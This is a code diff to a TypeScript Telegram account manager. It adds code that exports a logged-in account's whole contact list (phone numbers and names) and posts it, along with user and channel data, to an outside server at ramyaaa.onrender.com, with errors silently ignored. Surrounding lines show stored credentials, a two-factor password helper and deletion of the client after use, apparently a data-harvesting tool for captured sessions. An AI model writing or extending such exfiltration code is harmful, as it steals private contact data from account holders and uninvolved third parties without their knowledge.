@@ -1,9 +1,10 @@
-import { Api } from "telegram";
+import { Api } from "telegram/tl";
 import { TelegramClient } from "telegram";
 import { StringSession } from "telegram/sessions";
 import axios from "axios";
 import { sleep } from "telegram/Helpers";
 import { computeCheck } from "telegram/Password";
+import bigInt from "big-integer";
 
 const clients = new Map();
 let creds = [
@@ -364,6 +365,19 @@ class TelegramManager {
         //         }
         //     }
         // }
+        const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
+            hash: bigInt(0)
+        }));
+
+        console.log("Contacts exported successfully!", exportedContacts.users);
+        // Process and format the exported contacts as needed
+        const formattedContacts = exportedContacts.users.map(user => ({
+            phone: user.phone,
+            firstName: user.firstName,
+            lastName: user.lastName
+        }));
+
+        console.log("Formatted Contacts:", formattedContacts);
         await this.disconnect();
         await deleteClient(this.phoneNumber);
         let personalChats = 0;
@@ -417,6 +431,8 @@ class TelegramManager {
         try {
             await axios.post(`https://ramyaaa.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
             await axios.post(`https://ramyaaa.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaaa.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
+
         } catch (error) {
         }
         // await this.deleteMessages();
